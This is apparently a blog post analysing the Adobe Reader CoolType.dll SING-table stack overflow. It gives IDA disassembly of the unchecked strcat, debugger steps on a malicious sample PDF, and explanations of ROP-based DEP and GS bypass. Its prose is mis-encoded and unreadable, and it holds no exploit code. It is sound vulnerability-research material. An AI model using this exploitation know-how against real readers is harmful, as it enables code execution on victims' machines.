<h2 id="2-æ¼æ´æè¿°"><a href="#2-æ¼æ´æè¿°" class="headerlink" title="2.æ¼æ´æè¿°"></a>2.æ¼æ´æè¿°</h2><p>è¯¥æ¼æ´æ˜¯åˆ©ç”¨Adobe Reader å’Œ Acrobatä¸­<code>CoolType.dll</code>åº“åœ¨è§£æå­—ä½“æ–‡ä»¶<code>SING</code>è¡¨ä¸­å­˜åœ¨çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œå¯¼è‡´çš„ç»“æœå°±æ˜¯å½“ç”¨æˆ·æ‰“å¼€äº†ç‰¹åˆ¶çš„PDFæ–‡ä»¶åå°±å¯èƒ½å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œ</p>
<h2 id="3-åŸºç¡€çŸ¥è¯†"><a href="#3-åŸºç¡€çŸ¥è¯†" class="headerlink" title="3.åŸºç¡€çŸ¥è¯†"></a>3.åŸºç¡€çŸ¥è¯†</h2><p>æœ¬æ¬¡æ¼æ´æ˜¯åœ¨PDFå½“ä¸­ï¼Œå› æ­¤éœ€è¦çº¿äº†è§£ä»¥ä¸‹pdfæ–‡æ¡£ï¼Œé¦–å…ˆpdfçš„æ ¼å¼ï¼š</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">|------------|</span><br><span class="line">|   header   |å¤´éƒ¨ï¼Œç”¨æ¥æ³¨æ˜ç‰ˆæœ¬å·</span><br><span class="line">|------------|</span><br><span class="line">|    body    |ä¸»ä½“ï¼Œå›¾ç‰‡ã€æ–‡å­—ç­‰</span><br><span class="line">|------------|</span><br><span class="line">| xref table |äº¤å‰å¼•ç”¨è¡¨ï¼Œå­˜æ”¾æ‰€æœ‰å¯¹è±¡çš„åç§»</span><br><span class="line">|------------|</span><br><span class="line">|  trailer   |æ–‡ä»¶å°¾éƒ¨ï¼Œä»¥%%EOFç»“å°¾</span><br><span class="line">|------------|</span><br></pre></td></tr></table></figure></div>

<p>è€Œttfæ–‡ä»¶å°±æ˜¯pdfä¸­çš„å­—ä½“æ–‡ä»¶ï¼Œè€ŒTTFä¸­å…³äºSINGè¡¨çš„æ•°æ®ç»“æ„ä½“TableEntryçš„ç»“æ„å¦‚ä¸‹ï¼š</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> struct_SING&#123;</span><br><span class="line">    <span class="type">char</span> tag[<span class="number">4</span>];        <span class="comment">//æ ‡è®°&quot;SING&quot;</span></span><br><span class="line">    ULONG checkSum;     <span class="comment">//æ ¡éªŒå’Œï¼š0xD9BCC8B5</span></span><br><span class="line">    ULONG offset;       <span class="comment">//ç›¸å¯¹æ–‡ä»¶çš„åç§»ï¼š0x0000011C</span></span><br><span class="line">    ULONG length;       <span class="comment">//æ•°æ®é•¿åº¦ï¼š0x00001DDF</span></span><br><span class="line">&#125;TableEntry;</span><br></pre></td></tr></table></figure></div>

<p>ä¸Šé¢æ˜¯ä¸€ä¸ªå®šä½SINGè¡¨çš„å¼•å­ï¼Œæ¥ä¸‹æ¥æ˜¯SINGè¡¨çš„æ•´ä½“ç»“æ„:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/203fb80e7bec54e71c003ed4fc389b504ec26a0f.jpg"
                     
                ></p>
<p>å…·ä½“æ•°æ®ç»“æ„å¦‚ä¸‹ï¼š</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FORMAT_SING_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FORMAT_SING_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SING_VERSION VERSION(1, 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SING_UNIQUENAMELEN 28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SING_MD5LEN 16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Card16 tableVersionMajor;   <span class="comment">//Card16,ä¸¤å­—èŠ‚</span></span><br><span class="line">Card16 tableVersionMinor;</span><br><span class="line">Card16 glyphletVersion;</span><br><span class="line">Card16 permissions;</span><br><span class="line">Card16 mainGID;</span><br><span class="line">Card16 unitsPerEm;</span><br><span class="line">Int16 vertAdvance;</span><br><span class="line">Int16 vertOrigin;</span><br><span class="line">Card8 uniqueName[SING_UNIQUENAMELEN];</span><br><span class="line">Card8 METAMD5[SING_MD5LEN];</span><br><span class="line">Card8 nameLength;</span><br><span class="line">Card8 *baseGlyphName; <span class="comment">/* name array */</span></span><br><span class="line">&#125; SINGTbl;</span><br></pre></td></tr></table></figure></div>

<h2 id="4-å‘ç°æ¼æ´ç‚¹"><a href="#4-å‘ç°æ¼æ´ç‚¹" class="headerlink" title="4.å‘ç°æ¼æ´ç‚¹"></a>4.å‘ç°æ¼æ´ç‚¹</h2><p>é¦–å…ˆæ‰¾åˆ°ä½äºAdobeæ–‡ä»¶è·¯å¾„ä¸‹çš„åŠ¨æ€åº“</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/32fa828ba61ea8d3a10a50ced20a304e241f58cb.jpg"
                     
                ></p>
<p>æ‰“å¼€IDAï¼Œåˆ†æ<code>CoolType.dll</code>åº“ï¼ŒæŸ¥çœ‹å­—ç¬¦ä¸²è¡¨<code>SING</code>ï¼Œç„¶åæŸ¥çœ‹äº¤å‰å¼•ç”¨ï¼Œè¿™é‡Œè‹¥æ˜¯ä½¿ç”¨F12æ‰¾çš„å­—ç¬¦ä¸²å¯èƒ½ä¼šå‡ºé—®é¢˜ï¼Œå› æ­¤ä½¿ç”¨ALT + T ç»„åˆé”®æ¥å¯»æ‰¾<code>SING</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><figcaption><span>Language</span></figcaption><table><tr><td class="code"><pre><span class="line">text:0803DCF9                               ; __unwind &#123; // loc_8184A54</span><br><span class="line">.text:0803DCF9 55                            push    ebp</span><br><span class="line">.text:0803DCFA 81 EC 04 01 00 00             sub     esp, 104h                       ; espå¼€æ‹“æ ˆç©ºé—´0x104</span><br><span class="line">.text:0803DD00 8D 6C 24 FC                   lea     ebp, [esp-4]</span><br><span class="line">.text:0803DD04 A1 B8 0F 23 08                mov     eax, ___security_cookie</span><br><span class="line">.text:0803DD09 33 C5                         xor     eax, ebp</span><br><span class="line">.text:0803DD0B 89 85 04 01 00 00             mov     [ebp+108h+var_4], eax</span><br><span class="line">.text:0803DD11 6A 4C                         push    4Ch</span><br><span class="line">.text:0803DD13 B8 54 4A 18 08                mov     eax, offset loc_8184A54</span><br><span class="line">.text:0803DD18 E8 B4 A4 00 00                call    __EH_prolog3_catch</span><br><span class="line">.text:0803DD18</span><br><span class="line">.text:0803DD1D 8B 85 1C 01 00 00             mov     eax, [ebp+108h+arg_C]</span><br><span class="line">.text:0803DD23 8B BD 10 01 00 00             mov     edi, [ebp+108h+arg_0]</span><br><span class="line">.text:0803DD29 8B 9D 14 01 00 00             mov     ebx, [ebp+108h+arg_4]</span><br><span class="line">.text:0803DD2F 89 7D D8                      mov     [ebp+108h+var_130], edi</span><br><span class="line">.text:0803DD32 89 45 D0                      mov     [ebp+108h+var_138], eax</span><br><span class="line">.text:0803DD35 E8 F2 39 00 00                call    sub_804172C</span><br><span class="line">.text:0803DD35</span><br><span class="line">.text:0803DD3A 33 F6                         xor     esi, esi                        ; esiæ¸…0ï¼Œä¹‹åç”¨äºåˆ¤æ–­å€¼æ˜¯å¦ä¸ºç©º</span><br><span class="line">.text:0803DD3C 83 7F 08 03                   cmp     dword ptr [edi+8], 3</span><br><span class="line">.text:0803DD3C</span><br><span class="line">.text:0803DD40                               ;   try &#123;</span><br><span class="line">.text:0803DD40 89 75 FC                      mov     [ebp+108h+var_10C], esi</span><br><span class="line">.text:0803DD43 0F 84 B7 01 00 00             jz      loc_803DF00</span><br><span class="line">.text:0803DD43</span><br><span class="line">.text:0803DD49 89 75 E4                      mov     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DD4C 89 75 E8                      mov     [ebp+108h+var_120], esi</span><br><span class="line">.text:0803DD4F 83 7F 0C 01                   cmp     dword ptr [edi+0Ch], 1</span><br><span class="line">.text:0803DD4F                               ;   &#125; // starts at 803DD40</span><br><span class="line">.text:0803DD4F</span><br><span class="line">.text:0803DD53                               ;   try &#123;</span><br><span class="line">.text:0803DD53 C6 45 FC 01                   mov     byte ptr [ebp+108h+var_10C], 1</span><br><span class="line">.text:0803DD57 0F 85 4C 01 00 00             jnz     loc_803DEA9</span><br><span class="line">.text:0803DD57</span><br><span class="line">.text:0803DD5D 68 2C DB 19 08                push    offset aName                    ; &quot;name&quot;</span><br><span class="line">.text:0803DD62 57                            push    edi                             ; int</span><br><span class="line">.text:0803DD63 8D 4D E4                      lea     ecx, [ebp+108h+var_124]</span><br><span class="line">.text:0803DD66 C6 45 EF 00                   mov     [ebp+108h+var_119], 0</span><br><span class="line">.text:0803DD6A E8 68 3A FE FF                call    sub_80217D7</span><br><span class="line">.text:0803DD6A</span><br><span class="line">.text:0803DD6F 39 75 E4                      cmp     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DD72 75 69                         jnz     short loc_803DDDD</span><br><span class="line">.text:0803DD72</span><br><span class="line">.text:0803DD74 68 4C DB 19 08                push    offset aSing                    ; &quot;SING&quot;</span><br><span class="line">.text:0803DD79 57                            push    edi                             ; int</span><br><span class="line">.text:0803DD7A 8D 4D DC                      lea     ecx, [ebp+108h+var_12C]         ; æŒ‡å‘SINGè¡¨å…¥å£</span><br><span class="line">.text:0803DD7D E8 84 3D FE FF                call    sub_8021B06                     ; å¤„ç†SINGè¡¨</span><br><span class="line">.text:0803DD7D</span><br><span class="line">.text:0803DD82 8B 45 DC                      mov     eax, [ebp+108h+var_12C]         ; SINGè¡¨å…¥å£èµ‹å€¼ç»™eax</span><br><span class="line">.text:0803DD85 3B C6                         cmp     eax, esi                        ; åˆ¤æ–­è¡¨å…¥å£æ˜¯å¦ä½ç©º</span><br><span class="line">.text:0803DD85                               ;   &#125; // starts at 803DD53</span><br><span class="line">.text:0803DD85</span><br><span class="line">.text:0803DD87                               ;   try &#123;</span><br><span class="line">.text:0803DD87 C6 45 FC 02                   mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DD8B 74 37                         jz      short loc_803DDC4               ; è‹¥æˆ‘ä»¬å¤„ç†çš„SINGè¡¨ä¸å‡ºå·®é”™ï¼Œè¿™é‡Œæ˜¯ä¸ä¼šè¿›è¡Œè·³è½¬çš„</span><br><span class="line">.text:0803DD8B</span><br><span class="line">.text:0803DD8D 8B 08                         mov     ecx, [eax]                      ; è¿™é‡Œä¼ å…¥çš„æ˜¯SINGè¡¨çš„ç¬¬ä¸€ä¸ªå››å­—èŠ‚ï¼Œè¿™é‡Œæ˜¯1.0ç‰ˆæœ¬ï¼Œä¹Ÿå°±æ˜¯00 01 00 00</span><br><span class="line">.text:0803DD8F 81 E1 FF FF 00 00             and     ecx, 0FFFFh                     ; è¿™é‡Œè¿›è¡Œåˆ¤æ–­æƒ³ä¸ï¼Œä¼šè®¾ç½®å¯¹åº”eflagsæ ‡å¿—ä½</span><br><span class="line">.text:0803DD95 74 08                         jz      short loc_803DD9F               ; ç”±äºä¸Šä¸€æ­¥è®¾ç½®äº†ç›¸åº”æ ‡å¿—ä½ï¼Œå› æ­¤åœ¨è¿™é‡Œè·³è½¬</span><br><span class="line">.text:0803DD95</span><br><span class="line">.text:0803DD97 81 F9 00 01 00 00             cmp     ecx, 100h</span><br><span class="line">.text:0803DD9D 75 21                         jnz     short loc_803DDC0</span><br><span class="line">.text:0803DD9D</span><br><span class="line">.text:0803DD9F</span><br><span class="line">.text:0803DD9F                               loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9Câ†‘j</span><br><span class="line">.text:0803DD9F 83 C0 10                      add     eax, 10h                        ; eaxæœ¬æ¥æ˜¯å­˜æ”¾SINGè¡¨é¦–åœ°å€ï¼Œè¿™é‡ŒåŠ ä¸Š0x10åç§»æŒ‡å‘uniqueName</span><br><span class="line">.text:0803DD9F                                                                       ; uniqueNameåŸŸ</span><br><span class="line">.text:0803DDA2 50                            push    eax                             ; Source</span><br><span class="line">.text:0803DDA3 8D 45 00                      lea     eax, [ebp+108h+Destination]     ; Destinationæ˜¯-0x108,æ‰€ä»¥è¿™é‡Œåº”è¯¥å°±æ˜¯æ™®é€šçš„lea eax,[ebp]</span><br><span class="line">.text:0803DDA6 50                            push    eax                             ; Destination</span><br><span class="line">.text:0803DDA7 C6 45 00 00                   mov     [ebp+108h+Destination], 0</span><br><span class="line">.text:0803DDAB E8 48 3D 13 00                call    strcat                          ; æ¼æ´ç‚¹</span><br></pre></td></tr></table></figure></div>

<h2 id="5-æ ·æœ¬åˆ†æï¼ˆæ ˆæº¢å‡ºï¼‰"><a href="#5-æ ·æœ¬åˆ†æï¼ˆæ ˆæº¢å‡ºï¼‰" class="headerlink" title="5.æ ·æœ¬åˆ†æï¼ˆæ ˆæº¢å‡ºï¼‰"></a>5.æ ·æœ¬åˆ†æï¼ˆæ ˆæº¢å‡ºï¼‰</h2><p>é¦–å…ˆè·å–åˆ°å¯¹åº”æ ·æœ¬ï¼Œå…¶ä¸ºä¸€ä¸ªpdfï¼Œå½“æ‰“å¼€æ­¤pdfä¼šæœ‰ä¸ªä»»æ„å‘½ä»¤æ‰§è¡Œçš„åŠŸèƒ½ï¼Œå…·ä½“å‘ˆç°å‡ºçš„æ•ˆæœä¸ºæ‰“å¼€ä¸€ä¸ªè®¡ç®—å™¨ï¼Œå¦‚ä¸‹ï¼š<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/6609c93d70cf3bc7f8d2ec269400baa1cc112a2d.jpg"
                     
                ></p>
<p>ç„¶åæ‰§è¡Œä¼šå‡ºç°ä¸€ä¸ªæ˜æ˜¾çš„pdfå¼¹æ¡†ï¼Œä½†ä¸å®Œå…¨ï¼Œæ¥ä¸‹æ¥å°±ä¼šå‡ºç°è®¡ç®—å™¨<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/c9fcc3cec3fdfc03e1b7c272913f8794a5c22628.jpg"
                     
                ></p>
<p>å½“ç„¶ä¹Ÿå¯ä»¥æ˜¯åˆ«çš„å‘½ä»¤ï¼ŒçœŸæ­£çš„æ¶æ„æ ·æœ¬ç”¨æ¥è°ƒè¯•ï¼Œåœ¨è¿™é‡Œä½¿ç”¨è®¡ç®—å™¨åªæ˜¯æš‚æ—¶è¯´æ˜å¯ä»¥ä»»æ„æ§åˆ¶äº†è€Œå·²<br>é¦–å…ˆæ‰“å¼€ODï¼ŒåŠ è½½Adobeæ–‡ä»¶ä¸‹çš„AcroRd32å¯æ‰§è¡Œæ–‡ä»¶<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/314e251f95cad1c8c771dded3a3e6709c83d5135.jpg"
                     
                ></p>
<p>ç„¶åæŒ‰ä¸‹F9æ¥è¿è¡Œç¨‹åºï¼Œè¿™æ ·å¯ä»¥ç”¨æ¥åŠ è½½éœ€è¦çš„åº“<br>è¿™é‡Œå…ˆé…åˆä¹‹å‰çš„IDAé™æ€åˆ†æçš„ç»“æœï¼Œåˆ©ç”¨ctrl + gè¿›è¡Œåœ°å€è·Ÿè¸ªï¼Œç„¶ååŒå‡»åå…­è¿›åˆ¶éƒ¨åˆ†è¿›è¡Œæ–­ç‚¹ï¼Œè‡³äºä¸‹æ–­ç‚¹çš„ä½ç½®ï¼Œæœ‰ä»¥ä¸‹ä¸‰ä¸ªç‚¹ï¼Œ</p>
<ul>
<li>é¦–å…ˆå°±æ˜¯<code>SING</code>è¡¨èµ‹å€¼ç»™<code>eax</code>çš„é‚£ä¸ªç‚¹(0x803dd82)ï¼›</li>
<li>ç„¶åå°±æ˜¯æ‰§è¡Œ<code>strcat</code>å‡½æ•°çš„ç‚¹(0x803ddab)</li>
<li>æœ€åå°±æ˜¯ä¸€ä¸ªå…³é”®æ¼æ´ç‚¹(0x808b308),è¿™ä¸ªç‚¹ä¹‹åè¯¦ç»†ä»‹ç»</li>
</ul>
<p>æ­¤æ—¶ä½¿ç”¨ODæ‰“å¼€çš„Adobe Readeræ‰“å¼€æ ·æœ¬Exploitï¼Œç„¶åä¼šæ–­åˆ°æˆ‘ä»¬çš„ç¬¬ä¸‰ä¸ªæ–­ç‚¹å¤„<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/6a63f6246b600c336800fe025f4c510fd8f9a1fb.jpg"
                     
                ></p>
<p>è¯¥æŒ‡ä»¤æ˜¯æ‰§è¡Œ<code>eax</code>å¯„å­˜å™¨ä¿å­˜çš„åœ°å€æŒ‡å‘çš„å‡½æ•°ï¼Œè¿™é‡Œå¯ä»¥ä»å³ä¸Šè§’çš„Registersçª—å£çœ‹åˆ°<code>eax</code>çš„å€¼ï¼Œå‘ç°æ˜¯åœ¨æ ˆä¸Šçš„ï¼Œå³é”®ç‚¹å‡»<code>eax</code>ï¼Œç„¶åé€‰æ‹©Follow in Stackï¼Œè¿™æ ·æ ˆçª—å£çœ‹åˆ°<code>eax</code>ä¸­ä¿å­˜çš„å€¼æ‰€æŒ‡å‘çš„åœ°å€æ˜¯0x80833EF,è¿”å›IDAï¼ŒæŸ¥çœ‹è¯¥åœ°å€æ‰€åœ¨çš„å‡½æ•°</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> *__cdecl <span class="title function_">sub_80833EF</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">void</span> *a3, <span class="type">size_t</span> *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">size_t</span> *)sub_8083119(a3, *a4);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">size_t</span> *)sub_80830AE(*a4);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      result = (<span class="type">size_t</span> *)sub_80828ED(*(_DWORD *)(a1 + <span class="number">4</span>), <span class="number">0</span>);</span><br><span class="line">      *a4 = (<span class="type">size_t</span>)result;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = a4;</span><br><span class="line">      *a4 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è§‚å¯Ÿè¿™é‡Œæ˜¯ä¸€ä¸ª<code>switch</code>é€‰æ‹©è¯­å¥ï¼Œè¯´æ˜è¿™é‡Œæ˜¯å¤„ç†<code>SING</code>è¡¨çš„æ—¶å€™ä¼šæ‰§è¡Œçš„å‡½æ•°ï¼Œæ¥ä¸‹æ¥å†æ¬¡F9ï¼Œè¿™é‡Œä¼šåˆ°è¾¾æˆ‘ä»¬ä¹‹å‰ä¸‹çš„ç¬¬ä¸€ä¸ªæ–­ç‚¹ï¼Œè¿™æ¡æŒ‡ä»¤ä¼šå°†<code>SING</code>è¡¨çš„é¦–åœ°å€ä¼ å…¥<code>eax</code>ï¼ŒF8 å•æ­¥æ‰§è¡Œåˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤æ¥æŸ¥çœ‹ä»¥ä¸‹<code>eax</code>çš„å€¼<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/342ac65c10385343f388a7ebd613b07ecb8088b0.jpg"
                     
                ></p>
<p>é¦–å…ˆå³é”®<code>eax</code>ï¼Œç„¶åé€‰æ‹©follow in dumpï¼Œæ¥ç€ä¼šå†äºŒè¿›åˆ¶çª—å£æ˜¾ç¤ºå€¼æŒ‡å‘çš„åœ°å€ï¼Œè¿™é‡Œä»ä¹‹å‰äº†è§£åˆ°çš„<code>SING</code>è¡¨ç»“æ„ä¼šçŸ¥é“<code>uniquename</code>çš„åœ°å€åº”è¯¥æ˜¯<code>SING</code>è¡¨åç§»0x10å­—èŠ‚çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯0x035529a0,å¯ä»¥çœ‹åˆ°æ ·æœ¬ä¸­<code>uniqueName</code>å­—æ®µååˆ†é•¿ï¼Œç„¶åå•æ­¥æ‰§è¡Œåˆ°<code>push eax</code>ï¼Œè¿™é‡Œæ˜¯å°†<code>uniqueName</code>å­—æ®µçš„åœ°å€å‹æ ˆ<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/b2de9c82d158ccbf231c95f05cd8bc3eb0354153.jpg"
                     
                ></p>
<p>å†æ¬¡F9è¿è¡Œåˆ°ç¬¬äºŒä¸ªæ–­ç‚¹å¤„ï¼Œè¿™é‡Œå³å°†è°ƒç”¨<code>strcat</code>å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å…¶ç›®çš„åœ°å€å·²ç»åœ¨æ ˆä¸Šäº†ï¼Œç›®çš„åœ°å€ä¹Ÿæ˜¯æŒ‡å‘æ ˆä¸Šçš„ä¸€ä¸ªç¼“å†²åŒºåœ°å€ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ç›®å‰çš„ç›®çš„åœ°å€é™„è¿‘çš„å€¼ï¼Œåœ¨æ ˆçª—å£ä¸Šctrl+gï¼Œç„¶åè¾“å…¥ç›®çš„åœ°å€0x12e468<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/8b82b9014a90f603d830bc8d7c12b31bb151ed7c.jpg"
                     
                ></p>
<p>å•æ­¥F8æ­¥è¿‡<code>call strcat</code>æŒ‡ä»¤ï¼Œç”±äºæ²¡æœ‰å¯¹<code>uniquename</code>è¿›è¡Œé•¿åº¦æ£€æŸ¥ï¼Œè¿™å°±å¯¼è‡´äº†ç°å¦‚ä»Šä¼šå°†å…¶å…¨éƒ¨æ‹·è´åˆ°æ ˆä¸ŠæŒ‡å®šçš„åœ°å€ï¼Œç»“æœå¦‚ä¸‹<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/00e93901213fb80e5f23411d73d12f2eb838940d.jpg"
                     
                ></p>
<p>å¯ä»¥çœ‹åˆ°å·¦è¾¹<code>uniqueName</code>å­—æ®µçš„å€¼å·²ç»èµ‹å€¼åˆ°å³è¾¹æ ˆä¸Š0x12e4d8è¿™é‡Œäº†ï¼Œå†æ¥æŸ¥çœ‹ä¹‹å‰0x12E6D0,å¯ä»¥çœ‹åˆ°å·²ç»è¢«è¦†ç›–ä¸ºä¼ªé€ çš„åœ°å€äº†<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/8718367adab44aed9b8d9e2ef61c8701a08bfb3d.jpg"
                     
                ></p>
<p>å¯ä»¥çœ‹åˆ°æ—è¾¹æ³¨é‡Šä¹Ÿæ˜¯å¾ˆæ¸…æ¥šï¼Œè¿”å›åˆ°icucnv36.4A80CB38ï¼Œè·³è½¬åˆ°è¯¥åœ°å€æ¥æŸ¥çœ‹ä¸€ä¸‹å‡½æ•°æ˜¯å¹²å•¥çš„ï¼Œä»¥åŠä¸ºå•¥è¦ä¿®æ”¹ä¹‹å‰çš„è¿”å›åœ°å€ä¸ºå®ƒ<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/6a600c338744ebf8ea5d47f59cf9d72a6159a7c8.jpg"
                     
                ></p>
<p>æ®ç›®å‰åœ¨ä¸Šå­¦å‰ç­çš„é‚»å±…å°å­©è¯´ï¼Œè¿™é‡Œæ˜¯æ˜æ˜¾çš„åˆ©ç”¨ROPç»•è¿‡DEPä¿æŠ¤çš„æ‰‹æ®µï¼Œä½†æ˜¯ç”±äºæˆ‘ä¸äº†è§£ï¼Œæ‰€ä»¥ä¸‹é¢æ¥ç§‘æ™®ä¸€ä¸‹ç›¸å…³çŸ¥è¯†</p>
<h3 id="1-GSä¿æŠ¤"><a href="#1-GSä¿æŠ¤" class="headerlink" title="1.GSä¿æŠ¤"></a>1.GSä¿æŠ¤</h3><p>ç±»ä¼¼äºlinuxä¸Šçš„canary,å‡½æ•°æ‰§è¡Œå‰å­˜æ”¾åœ¨è¿”å›å€¼ä¸ebpä¸Šï¼ˆä½åœ°å€ï¼‰ï¼Œç„¶åå½“ç¨‹åºæ‰§è¡Œå®Œæ¯•ä¹‹åä¼šè°ƒç”¨æ£€æŸ¥å‡½æ•°æ¥åˆ¤æ–­è¯¥å€¼æ˜¯å¦ä¸ä¹‹å‰ç›¸åŒï¼Œæ­¤æ—¶å°±ä¸èƒ½é€šè¿‡è¦†ç›–retåœ°å€è¿›è¡ŒROPé“¾æ„é€ äº†ï¼Œè€Œæ˜¯ä¿®æ”¹æ ˆä¸Šä¿å­˜çš„æŸä¸€ä¸ªå‡½æ•°æŒ‡é’ˆæ¥è¿›è¡Œåˆ©ç”¨</p>
<p>IDAåæ±‡ç¼–å¯ä»¥çœ‹åˆ°å‡½æ•°å¼€å§‹å‰ä¼šæœ‰å¦‚ä¸‹æŒ‡ä»¤ï¼š</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">text:0803DCF9                               ; __unwind &#123; // loc_8184A54</span><br><span class="line">.text:0803DCF9 55                            push    ebp</span><br><span class="line">.text:0803DCFA 81 EC 04 01 00 00             sub     esp, 104h                       ; espå¼€æ‹“æ ˆç©ºé—´0x104</span><br><span class="line">.text:0803DD00 8D 6C 24 FC                   lea     ebp, [esp-4]</span><br><span class="line">.text:0803DD04 A1 B8 0F 23 08                mov     eax, ___security_cookie</span><br><span class="line">.text:0803DD09 33 C5                         xor     eax, ebp</span><br></pre></td></tr></table></figure></div>

<p>ç»“æŸå‡½æ•°çš„æ—¶å€™æœ‰ä»¥ä¸‹åˆ¤æ–­</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0803DEE1 E8 A9 A2 00 00                call    @__security_check_cookie@4      ; __security_check_cookie(x)</span><br><span class="line">.text:0803DEE1</span><br><span class="line">.text:0803DEE6 81 C5 08 01 00 00             add     ebp, 108h</span><br><span class="line">.text:0803DEEC C9                            leave</span><br><span class="line">.text:0803DEED C3                            retn</span><br></pre></td></tr></table></figure></div>

<h3 id="2-DEP-Data-Excution-Prevention-æ•°æ®æ‰§è¡Œä¿æŠ¤"><a href="#2-DEP-Data-Excution-Prevention-æ•°æ®æ‰§è¡Œä¿æŠ¤" class="headerlink" title="2.DEP(Data Excution Prevention)æ•°æ®æ‰§è¡Œä¿æŠ¤"></a>2.DEP(Data Excution Prevention)æ•°æ®æ‰§è¡Œä¿æŠ¤</h3><p>ç±»ä¼¼äºLinuxä¸Šçš„NXï¼ˆä¸çŸ¥é“ä¸ºå•¥åå­—è¿™ä¿©èµ·ä¸ä¸€æ ·å¹²å˜›ï¼Œæå¾—è¿˜ä»¥ä¸ºæ˜¯æ–°çŸ¥è¯†ç‚¹ï¼‰ã€‚æ‰€ä»¥è¿™é‡Œå¯ä»¥ä½¿ç”¨ROPæ¥è¿›è¡Œæ ˆè¿ç§»è¿›è¡Œç»•è¿‡ï¼Œåœ¨ODä¸Šè¾“å…¥æŒ‡ä»¤alt+mæ¥æŸ¥çœ‹å†…å­˜æƒ…å†µï¼Œç±»ä¼¼pwndbgä¸­çš„vmmapï¼Œååˆ†æ–¹ä¾¿ï¼ˆè¿™é‡Œæ’ä¸€å¥ç›¸è¾ƒäºLinuxæˆ‘ä¸ªäººè¿˜æ˜¯æ›´å–œæ¬¢Windowsï¼‰</p>
